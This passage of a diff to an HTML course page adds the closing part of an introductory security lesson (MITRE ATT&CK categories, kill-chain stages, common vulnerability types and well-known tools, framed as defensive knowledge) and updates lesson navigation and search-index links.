+<p><strong>MITRE ATT&amp;CK Framework</strong>: Knowledge base of adversary tactics and techniques</p>
+<p>Categories:
+- Initial Access
+- Execution
+- Persistence
+- Privilege Escalation
+- Defense Evasion
+- Credential Access
+- Discovery
+- Lateral Movement
+- Collection
+- Command and Control
+- Exfiltration
+- Impact</p>
+<p>Used for threat modeling and detection development.</p>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<p>Understanding attacks requires knowing:
+1. <strong>Kill chain stages</strong>: Reconnaissance → Exploitation → Post-compromise
+2. <strong>Common vulnerabilities</strong>: SQL injection, XSS, misconfigurations
+3. <strong>Attack types</strong>: Network, web, wireless, social engineering
+4. <strong>Tools</strong>: Nmap, Metasploit, Burp Suite, Wireshark
+5. <strong>Post-exploitation</strong>: Escalation, persistence, lateral movement</p>
+<p><strong>Remember</strong>: This knowledge is for defense. Understanding how attacks work enables you to:
+- Identify vulnerabilities before attackers do
+- Detect attacks in progress
+- Design better security controls
+- Respond effectively to incidents</p>
+<p>In the next lesson, we'll cover defensive techniques and how to protect against these attacks.</p>
         
 
         <!-- Lesson Navigation (only show on non-homepage pages) -->
         
         <div class="lesson-nav">
             
-            <a href="../lesson1-6/" class="lesson-nav-button">
+            <a href="../../unit8/lesson8-3/" class="lesson-nav-button">
                 <span class="arrow">←</span>
-                <span>Previous: Lesson 1.6</span>
+                <span>Previous: Lesson 8.3</span>
             </a>
             
 
             <div class="lesson-nav-info">
                 <div class="current-lesson">Current Lesson</div>
-                <div class="lesson-title">Linux Installation Process</div>
+                <div class="lesson-title">Lesson 9.1</div>
             </div>
 
             
-            <a href="../../unit2/lesson2-1/" class="lesson-nav-button">
-                <span>Next: Lesson 2.1</span>
+            <a href="../lesson9-2/" class="lesson-nav-button">
+                <span>Next: Lesson 9.2</span>
                 <span class="arrow">→</span>
             </a>
             
@@ -1158,43 +1578,43 @@
                                 
                                 {
                                     title: "Lesson 1.1",
-                                    url: '../lesson1-1/',
+                                    url: '../../unit1/lesson1-1/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.2",
-                                    url: '../lesson1-2/',
+                                    url: '../../unit1/lesson1-2/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.3",
-                                    url: '../lesson1-3/',
+                                    url: '../../unit1/lesson1-3/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.4",
-                                    url: '../lesson1-4/',
+                                    url: '../../unit1/lesson1-4/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.5",
-                                    url: '../lesson1-5/',
+                                    url: '../../unit1/lesson1-5/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.6",
-                                    url: '../lesson1-6/',
+                                    url: '../../unit1/lesson1-6/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Linux Installation Process",
-                                    url: './',
+                                    url: '../../unit1/installation-process/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
@@ -1352,19 +1772,19 @@
                                 
                                 {
                                     title: "Lesson 9.1",
-                                    url: '../../unit9/lesson9-1/',
+                                    url: './',
                                     path: 'Curriculum > Unit 9'
                                 },
                                 
                                 {
                                     title: "Lesson 9.2",
-                                    url: '../../unit9/lesson9-2/',
+                                    url: '../lesson9-2/',
                                     path: 'Curriculum > Unit 9'
                                 },
                                 
                                 {
                                     title: "Lesson 9.3",
-                                    url: '../../unit9/lesson9-3/',
+                                    url: '../lesson9-3/',
                                     path: 'Curriculum > Unit 9'
                                 },
                                 
